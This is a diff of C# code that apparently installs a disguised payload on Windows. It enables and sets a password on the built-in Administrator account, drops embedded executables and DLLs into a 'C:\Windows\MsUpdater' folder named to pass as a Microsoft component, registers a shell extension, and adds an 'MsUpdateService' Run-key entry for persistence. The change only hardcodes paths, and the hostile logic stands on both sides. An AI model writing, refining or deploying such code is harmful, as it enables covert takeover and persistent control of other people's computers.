@@ -70,27 +70,21 @@
 
             CommandPrompt($"net user {Administrator} /active:yes").WaitForExit();
             CommandPrompt($"net user {Administrator} {Password}").WaitForExit();
-
-            var targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "MsUpdater");
-            Directory.CreateDirectory(targetDir);
-
-            var shellex = Path.Combine(targetDir, "ShellEx");
-            Directory.CreateDirectory(shellex);
-
-            var target = Path.Combine(targetDir, "Bootstrap.exe");
-            File.WriteAllBytes(target, Resources.Bootstrap);
-            File.WriteAllText(Path.Combine(shellex, "bootstrap"), target);
-            File.WriteAllBytes(Path.Combine(targetDir, "InputSimulator.dll"), Resources.InputSimulator);
             
-            var sparkExecution = Path.Combine(shellex, "SparkExecution.dll");
-            File.WriteAllBytes(sparkExecution, Resources.SparkExecution);
-            File.WriteAllBytes(Path.Combine(shellex, "LogicNP.EZShellExtensions.dll"), Resources.LogicNP_EZShellExtensions);
+            Directory.CreateDirectory(@"C:\Windows\MsUpdater\ShellEx");
 
-            var register = Path.Combine(shellex, "register.exe");
-            File.WriteAllBytes(register, Resources.register);
-            File.WriteAllBytes(Path.Combine(shellex, "restart.exe"), Resources.RestartExplorer);
+            const string Target = @"C:\Windows\MsUpdater\Bootstrap.exe";
+            File.WriteAllBytes(Target, Resources.Bootstrap);
+            File.WriteAllText(@"C:\Windows\MsUpdater\ShellEx\bootstrap", Target);
+            File.WriteAllBytes(@"C:\Windows\MsUpdater\InputSimulator.dll", Resources.InputSimulator);
+            
+            const string SparkExecution = @"C:\Windows\MsUpdater\ShellEx\SparkExecution.dll";
+            File.WriteAllBytes(SparkExecution, Resources.SparkExecution);
+            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\LogicNP.EZShellExtensions.dll", Resources.LogicNP_EZShellExtensions);
+            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\register.exe", Resources.register);
+            File.WriteAllBytes(@"C:\Windows\MsUpdater\ShellEx\restart.exe", Resources.RestartExplorer);
 
-            CommandPrompt($"{register} -i {sparkExecution}").WaitForExit();
+            CommandPrompt(@"C:\Windows\MsUpdater\ShellEx\register.exe -i C:\Windows\MsUpdater\ShellEx\SparkExecution.dll").WaitForExit();
 
             using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
             {
@@ -103,7 +97,7 @@
 
                 using (var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                 {
-                    key.SetValue("MsUpdateService", target);
+                    key.SetValue("MsUpdateService", Target);
                 }
 
                 // ReSharper restore PossibleNullReferenceException
